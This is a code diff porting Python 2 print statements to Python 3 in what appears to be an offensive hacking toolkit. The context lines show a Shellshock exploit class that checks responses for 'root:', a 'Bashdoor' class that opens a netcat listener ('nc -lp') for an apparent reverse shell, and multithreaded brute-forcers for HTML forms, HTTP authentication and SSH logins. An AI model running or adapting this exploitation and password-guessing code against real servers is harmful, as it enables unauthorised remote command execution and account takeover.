@@ -29,8 +29,8 @@ class Shellshock:
 		self.shellshock()
 
 	def shellshock(self):
-		print self.c.INFO + "Trying shellshock on : "+self.URL
-		print self.c.INFO + "With payload : "+self.PAYLOAD + "\n"
+		print(self.c.INFO + "Trying shellshock on : "+self.URL)
+		print(self.c.INFO + "With payload : "+self.PAYLOAD + "\n")
 
 		# Actions on the URL.
 		https = False
@@ -41,7 +41,7 @@ class Shellshock:
 			self.URL = self.URL.replace("https://", "")
 
 		if not "/" in self.URL:
-			print "You forgot to define the path to the cgi.."
+			print("You forgot to define the path to the cgi..")
 			self.URL = raw_input("Enter the path (ex: /cgi-bin/vuln) > ")
 
 		if https == True:
@@ -53,19 +53,19 @@ class Shellshock:
 			req = urllib2.Request(self.URL, headers={'User-Agent': self.PAYLOAD})
 			out = urllib2.urlopen(req)
 		except urllib2.HTTPError as e:
-			print self.c.ERROR + "Server responds [%d] code..." %(e.code)
+			print(self.c.ERROR + "Server responds [%d] code..." %(e.code))
 			sys.exit(1)
 		except urllib2.URLError:
-			print self.c.ERROR + "Humm, i think it's a wrong path..."
+			print(self.c.ERROR + "Humm, i think it's a wrong path...")
 			sys.exit(1)
 
 		res = out.read()
 
 		if "root:" in res:
-			print res
-			print self.c.PASS + "The server is vulnerable, you can try the bashdoor [--bashdoor]."
+			print(res)
+			print(self.c.PASS + "The server is vulnerable, you can try the bashdoor [--bashdoor].")
 		else:
-			print self.c.ERROR + "Server seems to not be vulnerable."
+			print(self.c.ERROR + "Server seems to not be vulnerable.")
 
 class Bashdoor:
 	'''
@@ -82,12 +82,12 @@ class Bashdoor:
 		self.run()
 
 	def listener(self):
-		print self.c.INFO + "Running the listener..."
+		print(self.c.INFO + "Running the listener...")
 		os.system("nc -lp %s" %(self.LPORT))
 		
 	def bashdoor(self):
-		print self.c.INFO + "Trying shellshock on : "+self.RURL 
-		print self.c.INFO + "With payload : "+self.PAYLOAD + "\n"
+		print(self.c.INFO + "Trying shellshock on : "+self.RURL)
+		print(self.c.INFO + "With payload : "+self.PAYLOAD + "\n")
 		req = urllib2.Request(self.RURL, headers={'User-Agent': self.PAYLOAD})
 		out = urllib2.urlopen(req)
 
@@ -116,7 +116,7 @@ class HTMLBrute:
 		self.THREADS = THREADS
 
 		if self.USER is None:
-			print self.c.ERROR + "I need an username... [--user]"
+			print(self.c.ERROR + "I need an username... [--user]")
 			sys.exit(1)
 
 		self.run()
@@ -149,8 +149,8 @@ class HTMLBrute:
 				data = str(response.read())
 
 				if not str(self.ERRORMSG) in data:
-					print self.c.PASS + "Found password for user %s:%s\n"%(self.USER, i),
-					print self.c.INFO + "Queue needs to complete before exiting..."
+					print(self.c.PASS + "Found password for user %s:%s\n"%(self.USER, i)),
+					print(self.c.INFO + "Queue needs to complete before exiting...")
 
 			except urllib2.HTTPError as e:
 				pass
@@ -161,9 +161,9 @@ class HTMLBrute:
 	def run(self):
 		q = Queue.Queue()
 
-		print self.c.INFO + "Lunching the HTML FORM bruteforcer."
+		print(self.c.INFO + "Lunching the HTML FORM bruteforcer.")
 
-		print self.c.MED + "Starting : " + str(self.THREADS) + " threads...\n"
+		print(self.c.MED + "Starting : " + str(self.THREADS) + " threads...\n")
 
 		with open(self.WORDLIST, "r") as l:
 			for line in l:
@@ -187,7 +187,7 @@ class HTTPBrute:
 		self.THREADS = THREADS
 
 		if self.USERNAME is None:
-			print self.c.ERROR + "I need an username... [--user]"
+			print(self.c.ERROR + "I need an username... [--user]")
 			sys.exit(1)
 
 		self.run()
@@ -218,7 +218,7 @@ class HTTPBrute:
 			try:
 				
 				result = urllib2.urlopen(req)
-				print self.c.PASS + "Hit! Found: %s:%s\n"%(self.USERNAME, i),
+				print(self.c.PASS + "Hit! Found: %s:%s\n"%(self.USERNAME, i)),
 				break
 
 			except urllib2.HTTPError:
@@ -233,22 +233,22 @@ class HTTPBrute:
   	def run(self):
   		q = Queue.Queue()
 
-  		print self.c.MED + "Lunching the HTTP bruteforcer..."
+  		print(self.c.MED + "Lunching the HTTP bruteforcer...")
 
 		try:
 			with open(self.WORDLIST, "r") as l:
 				for line in l:
 					q.put(line.rstrip('\n\r'))
 		except TypeError:
-			print self.c.ERROR + "Oh! You forgot to specify a wordlist..."
+			print(self.c.ERROR + "Oh! You forgot to specify a wordlist...")
 			sys.exit(1)
 		except IOError:
-			print self.c.ERROR + "Wordlist not found..."
+			print(self.c.ERROR + "Wordlist not found...")
 			sys.exit(1)
 
-		print self.c.MED + "Starting : "+ str(self.THREADS) + " threads...\n"
+		print(self.c.MED + "Starting : "+ str(self.THREADS) + " threads...\n")
 
-		print self.c.INFO + "Using random User-Agent..."
+		print(self.c.INFO + "Using random User-Agent...")
 
 		for i in range(int(self.THREADS)):
 			worker = threading.Thread(target=self.brute, args=(q))
@@ -257,7 +257,7 @@ class HTTPBrute:
 
 		q.join()
 
-		print self.c.INFO + "Scan finished at: "+time.strftime('%H:%M:%S')
+		print(self.c.INFO + "Scan finished at: "+time.strftime('%H:%M:%S'))
 
 class SSHBrute:
 	def __init__(self, HOST, PORT, USER, WORDLIST):
@@ -281,8 +281,8 @@ class SSHBrute:
 					username=self.USER, password=i,  
 					allow_agent=False, look_for_keys=False)
 
-				print self.c.PASS + "Found password %s:%s"%(self.USER, i)
-				print self.c.INFO + "Queue needs to complete before exiting..."
+				print(self.c.PASS + "Found password %s:%s"%(self.USER, i))
+				print(self.c.INFO + "Queue needs to complete before exiting...")
 
 				ssh.close()
 
